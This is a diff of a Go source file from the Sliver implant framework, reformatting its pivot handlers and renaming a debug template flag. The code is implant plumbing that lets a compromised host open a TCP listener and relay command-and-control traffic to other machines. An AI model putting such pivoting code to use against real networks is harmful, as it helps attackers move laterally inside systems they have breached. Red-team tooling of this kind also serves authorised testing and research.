@@ -1,17 +1,5 @@
 package handlers
 
-import (
-  // {{if .Debug}}
-  "log"
-  // {{end}}
-
-  "github.com/bishopfox/sliver/protobuf/commonpb"
-  "github.com/bishopfox/sliver/protobuf/sliverpb"
-  "github.com/bishopfox/sliver/sliver/pivots"
-  "github.com/bishopfox/sliver/sliver/transports"
-  "github.com/golang/protobuf/proto"
-)
-
 /*
   Sliver Implant Framework
   Copyright (C) 2019  Bishop Fox
@@ -30,11 +18,23 @@ import (
   along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */
 
+import (
+	// {{if .Config.Debug}}
+	"log"
+	// {{end}}
+
+	"github.com/bishopfox/sliver/protobuf/commonpb"
+	"github.com/bishopfox/sliver/protobuf/sliverpb"
+	"github.com/bishopfox/sliver/sliver/pivots"
+	"github.com/bishopfox/sliver/sliver/transports"
+	"github.com/golang/protobuf/proto"
+)
+
 var (
-  genericPivotHandlers = map[uint32]PivotHandler{
-	sliverpb.MsgPivotData:   pivotDataHandler,
-	sliverpb.MsgTCPPivotReq: tcpListenerHandler,
-  }
+	genericPivotHandlers = map[uint32]PivotHandler{
+		sliverpb.MsgPivotData:   pivotDataHandler,
+		sliverpb.MsgTCPPivotReq: tcpListenerHandler,
+	}
 )
 
 // GetPivotHandlers - Returns a map of pivot handlers
@@ -47,41 +47,41 @@ func tcpListenerHandler(envelope *sliverpb.Envelope, connection *transports.Conn
 	tcpPivot := &sliverpb.TCPPivotReq{}
 	err := proto.Unmarshal(envelope.Data, tcpPivot)
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("error decoding message: %v", err)
 		// {{end}}
-		tcpPivotResp := &sliverpb.TCPPivot {
-	  		Success: false,
-	  		Response: &commonpb.Response{Err: err.Error()},
+		tcpPivotResp := &sliverpb.TCPPivot{
+			Success:  false,
+			Response: &commonpb.Response{Err: err.Error()},
 		}
 		data, _ := proto.Marshal(tcpPivotResp)
-		connection.Send <- &sliverpb.Envelope {
-	  		ID:   envelope.GetID(),
-	  		Data: data,
-	  	}
+		connection.Send <- &sliverpb.Envelope{
+			ID:   envelope.GetID(),
+			Data: data,
+		}
 		return
 	}
 	err = pivots.StartTCPListener(tcpPivot.Address)
 	if err != nil {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("error decoding message: %v", err)
 		// {{end}}
-		tcpPivotResp := &sliverpb.TCPPivot {
-	  		Success: false,
-	  		Response: &commonpb.Response{Err: err.Error()},
+		tcpPivotResp := &sliverpb.TCPPivot{
+			Success:  false,
+			Response: &commonpb.Response{Err: err.Error()},
 		}
 		data, _ := proto.Marshal(tcpPivotResp)
-		connection.Send <- &sliverpb.Envelope {
-	  		ID:   envelope.GetID(),
-	  		Data: data,
-	  	}
+		connection.Send <- &sliverpb.Envelope{
+			ID:   envelope.GetID(),
+			Data: data,
+		}
 		return
 	}
-	tcpResp := &sliverpb.TCPPivot {
+	tcpResp := &sliverpb.TCPPivot{
 		Success: true,
 	}
 	data, _ := proto.Marshal(tcpResp)
-	connection.Send <- &sliverpb.Envelope {
+	connection.Send <- &sliverpb.Envelope{
 		ID:   envelope.GetID(),
 		Data: data,
 	}
@@ -98,7 +98,7 @@ func pivotDataHandler(envelope *sliverpb.Envelope, connection *transports.Connec
 	if pivotConn != nil {
 		pivots.PivotWriteEnvelope(pivotConn, origData)
 	} else {
-		// {{if .Debug}}
+		// {{if .Config.Debug}}
 		log.Printf("[pivotDataHandler] PivotID %d not found\n", pivData.GetPivotID())
 		// {{end}}
 	}
